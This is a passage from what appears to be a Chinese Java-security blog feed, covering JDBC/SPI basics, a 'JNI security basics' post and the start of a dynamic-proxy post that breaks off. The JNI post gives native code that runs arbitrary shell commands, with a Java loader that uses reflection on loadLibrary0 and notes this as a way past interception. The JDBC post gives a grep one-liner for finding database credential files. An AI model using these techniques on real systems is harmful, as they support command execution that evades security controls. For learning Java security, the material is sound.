    <content type="html"><![CDATA[<h1 id="JDBC-基础"><a href="#JDBC-基础" class="headerlink" title="JDBC 基础"></a>JDBC 基础</h1><p><code>JDBC(Java Database Connectivity)</code>是 Java 提供对数据库进行连接、操作的标准 API。Java 自身并不会去实现对数据库的连接、查询、更新等操作而是通过抽象出数据库操作的 API 接口(<code>JDBC</code>)，不同的数据库提供商必须实现 JDBC 定义的接口从而也就实现了对数据库的一系列操作。</p><h2 id="JDBC-Connection"><a href="#JDBC-Connection" class="headerlink" title="JDBC Connection"></a>JDBC Connection</h2><p>Java 通过<code>java.sql.DriverManager</code>来管理所有数据库的驱动注册，所以如果想要建立数据库连接需要先在<code>java.sql.DriverManager</code>中注册对应的驱动类，然后调用<code>getConnection</code>方法才能连接上数据库。</p><p>JDBC 定义了一个叫<code>java.sql.Driver</code>的接口类负责实现对数据库的连接，所有的数据库驱动包都必须实现这个接口才能够完成数据库的连接操作。<code>java.sql.DriverManager.getConnection(xx)</code>其实就是间接的调用了<code>java.sql.Driver</code>类的<code>connect</code>方法实现数据库连接的。数据库连接成功后会返回一个叫做<code>java.sql.Connection</code>的数据库连接对象，一切对数据库的查询操作都将依赖于这个<code>Connection</code>对象。</p><p>JDBC 连接数据库的一般步骤:</p><ol><li>注册驱动，<code>Class.forName(&quot;数据库驱动的类名&quot;)</code>。</li><li>获取连接，<code>DriverManager.getConnection(xxx)</code>。</li></ol><p><strong>JDBC 连接数据库示例代码如下:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> com.mysql.jdbc.Driver;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dbconn</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, SQLException </span>&#123;<br>        Class.forName(<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>);<span class="hljs-comment">//注册驱动类</span><br>        DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/mysql&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;administrator&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>传统的 Web 应用的数据库配置信息一般都是存放在<code>WEB-INF</code>目录下的<code>*.properties</code>、<code>*.yml</code>、<code>*.xml</code>中的,如果是<code>Spring Boot</code>项目的话一般都会存储在 jar 包中的<code>src/main/resources/</code>目录下。常见的存储数据库配置信息的文件路径如：<code>WEB-INF/applicationContext.xml</code>、<code>WEB-INF/hibernate.cfg.xml</code>、<code>WEB-INF/jdbc/jdbc.properties</code>，一般情况下使用 find 命令加关键字可以轻松的找出来，如查找 Mysql 配置信息: <code>find 路径 -type f |xargs grep &quot;com.mysql.jdbc.Driver&quot;</code>。</p><p>第一步可见是<code>反射+初始化类</code>往<code>DriverManager</code>注册了 JDBC 驱动类</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220411221037961.png"></p><p>然而，如果不进行注册驱动类，也可以也可以连接数据库，为了直观说明，列出所有数据库</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Statement st = conn.createStatement();<br>        ResultSet resultSet = st.executeQuery(<span class="hljs-string">&quot;show databases&quot;</span>);<br>        <span class="hljs-keyword">while</span> (resultSet.next()) &#123;<br>            System.out.println(resultSet.getString(<span class="hljs-number">1</span>));<br>        &#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220412150844759.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220412150916179.png"></p><p>这里需要介绍到 Java 的一大特性:<code>Java SPI(Service Provider Interface)</code></p><p>我们知道 JVM 中由三个类加载器，<code>BootstrapClassLoader</code>，<code> ExtClassLoader</code>，<code>AppClassLoader</code>。其采用双亲委派模式。同时 JDK 也建议我们在加载类的时候使用这种方式。但是如果 SPI 使用这种方式就会导致找不到类的问题。</p><p>我们知道 JDBC 中的接口是 Java 的核心包，在 rt.jar 中，这个 jar 是由<code>BootstrapClassLoadre</code>来加载的。</p><p>其次，SPI 的加载规则是根据 jar 包中 META-INF 下 services 下的文件来查找对应实现类的。在 META-INF 下 services 下会定义一个文件，其文件名是接口类的全类型，而文件的内容是实现类的全类名。</p><p>再次，实现类的加载是在<code>DriverManager</code>中来调用，通过<code>Class.forName</code>来加载实现类，而<code>Class.forName</code>使用的是当前类的类加载器，当前类的类加载器是<code>BootstrapClassLoader</code>，我们知道<code>BootstrapClassLoader</code>默认是加载 rt.jar 的。明显第三方实现不在 rt.jar</p><p>最后，怎么解决这个问题呢，SPI 是采用<code>ContextClassLoader</code>来加载第三方实现类，这样就避免了父<code>ClassLoader-BootstrapClassLoader</code>去加载本应该由子<code>ClassLoader-AppClassLoader</code>加载的类。而<code>ContextClassLoader</code>就是被设计来解决这样的问题的。</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220412165959355.png"></p><p><code>DriverManager</code>在初始化的时候会调用<code>java.util.ServiceLoader</code>类提供的 SPI 机制，Java 会自动扫描 jar 包中的<code>META-INF/services</code>目录下的文件，并且还会自动的<code>Class.forName(文件中定义的类)</code>，这也就解释了为什么不需要<code>Class.forName</code>也能够成功连接数据库的原因了。</p>]]></content>
    
    
    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNI安全基础</title>
    <link href="/2023/03/15/JNI%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/03/15/JNI%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="JNI-安全基础"><a href="#JNI-安全基础" class="headerlink" title="JNI 安全基础"></a>JNI 安全基础</h1><h2 id="JNI-简介"><a href="#JNI-简介" class="headerlink" title="JNI 简介"></a>JNI 简介</h2><p>java native interface</p><p>一般情况下，我们完全可以使用 Java 语言编写程序，但某些情况下，Java 可能会不满足应用程序的需求，或者是不能更好的满足需求，比如：</p><ul><li>标准的 Java 类库不支持应用程序平台所需的平台相关功能。</li><li>我们已经用另一种语言编写了一个类库，如何用 Java 代码调用？</li><li>某些运行次数特别多的方法代码，为了加快性能，我们需要用更接近硬件的语言（比如汇编）编写。</li></ul><p>上面这三种需求，其实说到底就是如何用 Java 代码调用不同语言编写的代码。那么 JNI 应运而生了。</p><p>从 Java 1.1 开始，Java Native Interface (JNI)标准就成为 java 平台的一部分，它允许 Java 代码和其他语言写的代码进行交互。JNI 一开始是为了本地已编译语言，尤其是 C 和 C++而设计 的，但是它并不妨碍你使用其他语言，只要调用约定受支持就可以了。使用 java 与本地已编译的代码交互，通常会丧失平台可移植性。但是，有些情况下这样做是可以接受的，甚至是必须的，比如，使用一些旧的库，与硬件、操作系统进行交互，或者为了提高程序的性能。JNI 标准至少保证本地代码能工作在任何 Java 虚拟机实现下。</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2022011915192625.png"></p><p>通过 JNI，我们就可以通过 Java 程序（代码）调用到操作系统相关的技术实现的库函数，从而与其他技术和系统交互，使用其他技术实现的系统的功能；同时其他技术和系统也可以通过 JNI 提供的相应原生接口开调用 Java 应用系统内部实现的功能。</p><p>在 windows 系统上，一般可执行的应用程序都是基于 native 的 PE 结构，windows 上的 JVM 也是基于 native 结构实现的。Java 应用体系都是构建于 JVM 之上。</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2022011915192626.png"></p><p>可能有人会问，Java 不是跨平台的吗？如果用 JNI，那么程序不就将失去跨平台的优点?确实是这样的。</p><p><strong>JNI 的缺点：</strong></p><ul><li><p>程序不再跨平台。要想跨平台，必须在不同的系统环境下重新编译本地语言部分。</p></li><li><p>程序不再是绝对安全的，本地代码的不当使用可能导致整个程序崩溃。一个通用规则是，你应该让本地方法集中在少数几个类当中。这样就降低了 JAVA 和 C 之间的耦合性。</p></li></ul><p>目前来讲使用 JNI 的缺点相对于优点还是可以接受的，可能后面随着 Java 的技术发展，我们不在需要 JNI，但是目前 JDK 还是一直提供对 JNI 标准的支持。</p><h2 id="定义-native-方法"><a href="#定义-native-方法" class="headerlink" title="定义 native 方法"></a>定义 native 方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandExec</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> String <span class="hljs-title">exec</span><span class="hljs-params">(String command)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="生成头文件"><a href="#生成头文件" class="headerlink" title="生成头文件"></a>生成头文件</h2><p>JDK10 移除了<code>javah</code>,需要改为<code>javac</code>加<code>-h</code>参数的方式生产头文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac -cp . CommandExec.java<br>javah -d package -cp . package.CommandExec<br><br><span class="hljs-comment">#jdk&gt;=10</span><br>javac -cp . .\CommandExec.java -h ./  <span class="hljs-comment">#生成class</span><br><br>javac ./CommandExec.java -h ./<br></code></pre></td></tr></table></figure><p>生成的头文件包含了<code>jni.h</code>，在 jdk 目录下找到<code>include/jni.h</code>以及<code>include/win32/jni_md.h</code>等文件</p><p>在生成的头文件<code>myjavasec_CommandExec.h</code>有着严格的命名规则</p><h2 id="JNI-基础数据类型"><a href="#JNI-基础数据类型" class="headerlink" title="JNI 基础数据类型"></a>JNI 基础数据类型</h2><table><thead><tr><th align="left">Java 类型</th><th align="left">JNI 类型</th><th align="left">C/C++类型</th><th align="left">大小</th></tr></thead><tbody><tr><td align="left">Boolean</td><td align="left">Jblloean</td><td align="left">unsigned char</td><td align="left">无符号 8 位</td></tr><tr><td align="left">Byte</td><td align="left">Jbyte</td><td align="left">char</td><td align="left">有符号 8 位</td></tr><tr><td align="left">Char</td><td align="left">Jchar</td><td align="left">unsigned short</td><td align="left">无符号 16 位</td></tr><tr><td align="left">Short</td><td align="left">Jshort</td><td align="left">short</td><td align="left">有符号 16 位</td></tr><tr><td align="left">Int</td><td align="left">Jint</td><td align="left">int</td><td align="left">有符号 32 位</td></tr><tr><td align="left">Long</td><td align="left">Jlong</td><td align="left">long long</td><td align="left">有符号 64 位</td></tr><tr><td align="left">Float</td><td align="left">Jfloat</td><td align="left">float</td><td align="left">32 位</td></tr><tr><td align="left">Double</td><td align="left">Jdouble</td><td align="left">double</td><td align="left">64 位</td></tr></tbody></table><p><a href="https://blog.csdn.net/qq_25722767/article/details/52557235">jni 中 java 与原生代码通信规则</a></p><h2 id="编写-c-c-代码"><a href="#编写-c-c-代码" class="headerlink" title="编写 c/c++代码"></a>编写 c/c++代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;myjavasec_CommandExec.h&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function">JNIEXPORT jstring</span><br><span class="hljs-function"></span><br><span class="hljs-function">    JNICALL</span><br><span class="hljs-function">    <span class="hljs-title">Java_myjavasec_CommandExec_exec</span><span class="hljs-params">(JNIEnv *env, jclass jclass, jstring str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (str != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        jboolean jsCopy;<br>        <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cmd = env-&gt;<span class="hljs-built_in">GetStringUTFChars</span>(str, &amp;jsCopy);<br>        FILE *fd = <span class="hljs-built_in">popen</span>(cmd, <span class="hljs-string">&quot;r&quot;</span>);<br>        <span class="hljs-keyword">if</span> (fd != <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            string result;<br>            <span class="hljs-keyword">char</span> buf[<span class="hljs-number">128</span>];<br>            <span class="hljs-keyword">while</span> (<span class="hljs-built_in">fgets</span>(buf, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf), fd) != <span class="hljs-literal">NULL</span>)<br>            &#123;<br>                result += buf;<br>            &#125;<br>            <span class="hljs-built_in">pclose</span>(fd);<br>            <span class="hljs-keyword">return</span> env-&gt;<span class="hljs-built_in">NewStringUTF</span>(result.<span class="hljs-built_in">c_str</span>());<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">g++.exe -I<span class="hljs-string">&quot;%JAVA_HOME%\include&quot;</span> -I<span class="hljs-string">&quot;%JAVA_HOME%\include\win32&quot;</span> -shared -o cmd.dll JNI-Exec.cpp<br></code></pre></td></tr></table></figure><p>现在已经生成了对应的 dll 文件，编写一个 java 来调用 dll 文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">VerifyExec</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String COMMAND_CLASS_NAME = <span class="hljs-string">&quot;myjavasec.CommandExec&quot;</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * CommandExec类字节码</span><br><span class="hljs-comment">     * 只有一个public static native String exec(String cmd);的方法</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">byte</span>[] COMMAND_CLASS_BYTES = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;<br>            -<span class="hljs-number">54</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">70</span>, -<span class="hljs-number">66</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">52</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">12</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">13</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">14</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">60</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">105</span>, <span class="hljs-number">116</span>, <span class="hljs-number">62</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">40</span>, <span class="hljs-number">41</span>, <span class="hljs-number">86</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">67</span>, <span class="hljs-number">111</span>, <span class="hljs-number">100</span>, <span class="hljs-number">101</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">76</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">101</span>, <span class="hljs-number">78</span>, <span class="hljs-number">117</span>, <span class="hljs-number">109</span>, <span class="hljs-number">98</span>, <span class="hljs-number">101</span>, <span class="hljs-number">114</span>, <span class="hljs-number">84</span>, <span class="hljs-number">97</span>, <span class="hljs-number">98</span>, <span class="hljs-number">108</span>, <span class="hljs-number">101</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">101</span>, <span class="hljs-number">120</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">38</span>, <span class="hljs-number">40</span>, <span class="hljs-number">76</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">47</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">83</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">59</span>, <span class="hljs-number">41</span>, <span class="hljs-number">76</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">47</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">83</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">59</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">83</span>, <span class="hljs-number">111</span>, <span class="hljs-number">117</span>, <span class="hljs-number">114</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">70</span>, <span class="hljs-number">105</span>, <span class="hljs-number">108</span>, <span class="hljs-number">101</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-number">67</span>, <span class="hljs-number">111</span>, <span class="hljs-number">109</span>, <span class="hljs-number">109</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">100</span>, <span class="hljs-number">69</span>, <span class="hljs-number">120</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">46</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">21</span>, <span class="hljs-number">109</span>, <span class="hljs-number">121</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">115</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">47</span>, <span class="hljs-number">67</span>, <span class="hljs-number">111</span>, <span class="hljs-number">109</span>, <span class="hljs-number">109</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">100</span>, <span class="hljs-number">69</span>, <span class="hljs-number">120</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">47</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">79</span>, <span class="hljs-number">98</span>, <span class="hljs-number">106</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">116</span>, <span class="hljs-number">0</span>, <span class="hljs-number">33</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">29</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">42</span>, -<span class="hljs-number">73</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">79</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span><br>    &#125;;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        String cmd = <span class="hljs-string">&quot;whoami&quot;</span>;<span class="hljs-comment">// 定于需要执行的cmd</span><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            ClassLoader loader = <span class="hljs-keyword">new</span> ClassLoader(VerifyExec.class.getClassLoader()) &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.findClass(name);<br>                    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>                        <span class="hljs-keyword">return</span> defineClass(COMMAND_CLASS_NAME, COMMAND_CLASS_BYTES, <span class="hljs-number">0</span>, COMMAND_CLASS_BYTES.length);<br>                    &#125;<br>                &#125;<br>            &#125;;<br><br>            <span class="hljs-comment">// 测试时候换成自己编译好的lib路径</span><br>            File libPath = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;D:\\program\\java\\moonlight\\src\\main\\java\\myjavasec\\cmd.dll&quot;</span>);<br><br>            <span class="hljs-comment">// load命令执行类</span><br>            Class commandClass = loader.loadClass(<span class="hljs-string">&quot;myjavasec.CommandExec&quot;</span>);<br><br>            <span class="hljs-comment">// 可以用System.load也加载lib也可以用反射ClassLoader加载,如果loadLibrary0</span><br>            <span class="hljs-comment">// 也被拦截了可以换java.lang.ClassLoader$NativeLibrary类的load方法。</span><br><span class="hljs-comment">//            System.load(&quot;/Users/yz/IdeaProjects/javaweb-sec/javaweb-sec-source/javase/src/main/java/com/anbai/sec/cmd/libcmd.jnilib/libcmd.jnilib&quot;);</span><br>            Method loadLibrary0Method = ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;loadLibrary0&quot;</span>, Class.class, File.class);<br>            loadLibrary0Method.setAccessible(<span class="hljs-keyword">true</span>);<br>            loadLibrary0Method.invoke(loader, commandClass, libPath);<br><br>            String content = (String) commandClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(<span class="hljs-keyword">null</span>, cmd);<br>            System.out.println(content);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java动态代理</title>
    <link href="/2023/03/15/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    <url>/2023/03/15/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Java动态代理"><a href="#Java动态代理" class="headerlink" title="Java动态代理"></a>Java动态代理</h1><p>就像研究反序列化一样，我们可以自定义<code>writeObject</code>，写入我们想要写入的；动态代理通过Java的反射机制，劫持到所持有的委托类对象的相关方法，成为特定的服务；这样做一是隔绝了直接调用相关业务类的方法或者比静态代理(代码写死)更加灵活，通过代理类来调用一些方法；也可以自定义一些方法在其中（面向切面编程：切入点前执行aaa，切入点后执行bbb），这样可以完成对程序的无侵入式扩展</p><p><strong>Java动态代理主要使用场景：</strong></p><ol><li>统计方法执行所耗时间</li><li>在方法执行前后添加日志</li><li>检测方法的参数或返回值</li><li>方法访问权限控制</li><li>方法<code>Mock</code>测试</li></ol><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><h3 id="java-lang-reflect-Proxy"><a href="#java-lang-reflect-Proxy" class="headerlink" title="java.lang.reflect.Proxy"></a>java.lang.reflect.Proxy</h3><p>生成动态代理类，创建代理类实例，实现了<code>Serializable</code>接口</p><p>主要方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 